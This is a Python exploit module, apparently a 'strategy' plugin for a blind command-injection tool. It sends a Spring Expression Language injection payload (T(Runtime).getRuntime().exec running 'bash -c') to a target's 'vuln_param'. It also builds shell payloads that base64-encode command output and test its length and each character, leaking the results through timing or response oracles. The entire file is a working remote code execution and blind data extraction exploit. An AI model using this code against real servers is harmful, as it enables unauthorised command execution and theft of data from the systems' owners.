import requests
from strategies.abstract_strategy import AbstractStrategy

class JavaRCEStrategy(AbstractStrategy):
    def __init__(self, url="http://localhost/"):
        self.url = url
        
    def send_payload(self, payload, timeout=10):
        try:
            params = {'vuln_param': f"${{T(Runtime).getRuntime().exec(new String[]{{\"bash\",\"-c\", \"{payload}\"}}).waitFor()}}"}
            cookies = {
                'JSESSIONID': 'XXXXXXXXX'
            }
            response = requests.get(self.url, params=params, cookies=cookies)
            response.raise_for_status() # Comment this if you base your oracle on status code, or if the endpoint doesn't return 200 status code
            
            # Example time-based oracle. Don't forget to add sleep in your payload with the timeout value
            return response.elapsed.total_seconds() <= timeout
            # Exemple search for a specific error message in the response text
            return "SPECIFIC ERROR MESSAGE" not in response.text # or return "SPECIFIC SUCCESS MESSAGE" in response.text
            # Exemple parse specific output, eg. if the backend replies something like "Hi Mister 0! This is the output code: 0. Good luck haha!"
            return response.text.split("This is the output code:")[0].split(".")[0] == "0" 
            # If the backend returns a 200 status code when there is no error
            return response.status_code == 200
        except Exception as e:
            print(e)
            return None
    
    def create_length_check_payload(self, cmd, length):
        return f"t=$({cmd}|base64|tr -d '\n'); [ ${{#t}} -ge {length} ] || mismatch"

    def create_char_check_payload(self, cmd, position, char_value):
        return f"t=$({cmd}|base64|tr -d '\n');echo $t|cut -c{position+1}|od -An -tuC -N1 | tr -d ' '|xargs -I{{}} expr {{}} '=' {char_value}||mismatch"

    def create_char_less_than_payload(self, cmd, position, char_value):
        return f"t=$({cmd}|base64|tr -d '\n');echo $t|cut -c{position+1}|od -An -tuC -N1 | tr -d ' '|xargs -I{{}} expr {{}} '<' {char_value}||mismatch" 